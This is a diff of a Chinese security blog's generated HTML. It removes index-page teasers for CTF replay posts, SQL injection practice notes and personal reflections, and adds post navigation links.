-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/05/2024%E7%BD%91%E9%BC%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/11/05/2024%E7%BD%91%E9%BC%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">2024网鼎杯MISC复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-11-05 20:15:34" itemprop="dateCreated datePublished" datetime="2024-11-05T20:15:34+08:00">2024-11-05</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-11-07 11:51:56" itemprop="dateModified" datetime="2024-11-07T11:51:56+08:00">2024-11-07</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>没时间现场打，线下看着网上的WP复现学习一下。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/11/05/2024%E7%BD%91%E9%BC%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
 
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">2024集团网络安全攻防赛决赛复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-10-21 19:02:37" itemprop="dateCreated datePublished" datetime="2024-10-21T19:02:37+08:00">2024-10-21</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-10-23 21:56:41" itemprop="dateModified" datetime="2024-10-23T21:56:41+08:00">2024-10-23</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>这次整个比赛没拿到奖，自己负主要责任。其实就差一道题了，web方向的sql注入没做出来。可惜的同时也感受到了自己的菜。还是要多练习啊。。。老本吃不了了。</p>
-<p>但是比赛就是这样，你觉得自己差一道，可能人家也觉得自己差一道。所以硬实力才是最重要的。</p>
-<p>复现一下：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/21/2024%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E8%B5%9B%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                Read more &raquo;
-              </a>
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/11/05/2024%E7%BD%91%E9%BC%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/" rel="prev" title="2024网鼎杯MISC复现">
+                  <i class="fa fa-angle-left"></i> 2024网鼎杯MISC复现
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">sql注入刷题</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-10-19 13:19:53" itemprop="dateCreated datePublished" datetime="2024-10-19T13:19:53+08:00">2024-10-19</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-11-17 22:41:27" itemprop="dateModified" datetime="2024-11-17T22:41:27+08:00">2024-11-17</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>把之前做过的一些sql注入的题重新做一遍，边做边记录边思考。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/19/sql%E6%B3%A8%E5%85%A5%E5%88%B7%E9%A2%98/#more" rel="contents">
-                Read more &raquo;
-              </a>
+            <div class="post-nav-item">
+                <a href="/2024/11/18/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="next" title="代码审计">
+                  代码审计 <i class="fa fa-angle-right"></i>
+                </a>
             </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
+          </div>
     </footer>
   </article>
 </div>
@@ -616,437 +287,7 @@
 
 
 
-    
 
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/06/misc%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/10/06/misc%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">misc复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-10-06 21:18:28 / Modified: 21:45:38" itemprop="dateCreated datePublished" datetime="2024-10-06T21:18:28+08:00">2024-10-06</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开一篇文章做一些比赛的misc复现。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/06/misc%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/28/%E6%9D%82%E8%B0%883/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/09/28/%E6%9D%82%E8%B0%883/" class="post-title-link" itemprop="url">杂谈3</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-09-28 23:26:04 / Modified: 23:34:04" itemprop="dateCreated datePublished" datetime="2024-09-28T23:26:04+08:00">2024-09-28</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>九月份整个人的状态感觉就不太对，一大堆事把心态搞炸了，不过也从中学到了很多。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/09/28/%E6%9D%82%E8%B0%883/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">集团网络安全竞赛初赛</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-09-25 22:55:21 / Modified: 23:00:20" itemprop="dateCreated datePublished" datetime="2024-09-25T22:55:21+08:00">2024-09-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>集团比赛初赛，体验了一下<code>RDG</code>模式，和19年第一次打国赛那个半决赛的赛制有点像，类似于AWDplus，太久没打，一时间不知道怎么去传，后面放出了一个修复的demo，看了之后才明白怎么玩。</p>
-<p>简单记录一下：</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/09/25/%E9%9B%86%E5%9B%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/16/%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/09/16/%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">羊城杯MISC复现</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-
-      <time title="Created: 2024-09-16 12:00:22" itemprop="dateCreated datePublished" datetime="2024-09-16T12:00:22+08:00">2024-09-16</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-09-17 22:03:03" itemprop="dateModified" datetime="2024-09-17T22:03:03+08:00">2024-09-17</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>并没有参加羊城杯，但是题目听说质量很高，对着WP复现一下。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/09/16/%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/09/01/%E6%9D%82%E8%B0%882/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/touxiang.jpeg">
-      <meta itemprop="name" content="My0n9s">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | My0n9s'blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2024/09/01/%E6%9D%82%E8%B0%882/" class="post-title-link" itemprop="url">杂谈2</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2024-09-01 21:56:15 / Modified: 22:09:15" itemprop="dateCreated datePublished" datetime="2024-09-01T21:56:15+08:00">2024-09-01</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%9D%82%E8%B0%88/" itemprop="url" rel="index"><span itemprop="name">杂谈</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>HW结束了，结束的有点突然。宣布结束的那一刻，心里五味杂陈。会有一种 “啊？怎么突然就结束了”的感觉 。这也意味着这次省分之行也将划上终点。简单做个小结吧。</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/09/01/%E6%9D%82%E8%B0%882/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" title="Next page" aria-label="Next page" href="/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
 
 </div>
   </main>
